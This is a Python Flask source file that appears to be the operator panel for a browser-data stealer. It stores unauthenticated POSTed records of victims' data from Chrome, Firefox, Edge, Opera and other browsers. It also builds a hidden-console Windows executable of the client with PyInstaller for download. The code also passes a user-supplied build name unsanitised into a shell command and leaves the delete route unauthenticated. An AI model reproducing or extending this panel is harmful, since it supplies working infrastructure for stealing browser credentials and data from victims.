import json
import subprocess, os

from werkzeug.security import generate_password_hash, check_password_hash
from flask import render_template, redirect, request, url_for, send_from_directory, flash, session

from panel import app, db, import_path, config
from .models import Profile
from .forms import Config, Login


@app.route('/login', methods=['GET', 'POST'])
def login():
    form = Login()
    if request.method == 'POST':
        password = form.password.data
        hash = generate_password_hash(password)
        if check_password_hash(hash, config.server_password):
            session['logged'] = True
            return redirect(url_for('index'))
        else:
            flash('<b style="color:red;">Error</b>')
    return render_template('login.html', form=form)
    

@app.route('/logout')
def logout():
    if 'logged' in session:
        del session['logged']
    return redirect(url_for('login'))


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        data = request.get_data()
        data = json.loads(data)
        for k in data:
            data[k] = str(data[k]).replace('\n', '<br>')
        profile = Profile(name=data['name'], info=data['info'],
                        chrome=data['chrome'], brave=data['brave'],
                        chromium=data['chromium'], opera=data['opera'],
                        amigo=data['amigo'], firefox=data['firefox'],
                        edge=data['edge'],)
        try:
            db.session.add(profile)
            db.session.commit()
        except:
            print('error')
    if 'logged' in session:
        profiles = Profile.query.order_by(Profile.date.desc()).all()
        return render_template('index.html', profiles=profiles)
    else:
        return redirect(url_for('login'))


@app.route('/configure', methods=['GET', 'POST'])
def create_client():
    if 'logged' in session:
        flag = False
        form = Config()
        if request.method == 'POST' and not flag:
            try:
                flag = True
                current_path = os.getcwd()
                path = os.path.join('builds', f'{form.name.data}')
                os.mkdir(path)
                os.chdir(path)
                command = f'pyinstaller --onefile --noconsole --name {form.name.data} -p {import_path} ../../../client/__main__.py'
                subprocess.call(command)
                os.chdir(current_path)
                flash('<b style="color:green;">Build Completed</b>')
                return send_from_directory(directory=os.path.join('..', path, 'dist'), path=f'{form.name.data}.exe')
            except:
                flash('<b style="color:red;">Error</b>')
            finally:
                flag = False
        return render_template('configure.html', conf=form)
    else:
        return redirect(url_for('login'))


@app.route('/remove/<int:id>')
def remove(id):
    profiles = Profile.query.get_or_404(id)
    try:
        db.session.delete(profiles)
        db.session.commit()
    except:
        print('error')
    return redirect(url_for('index'))


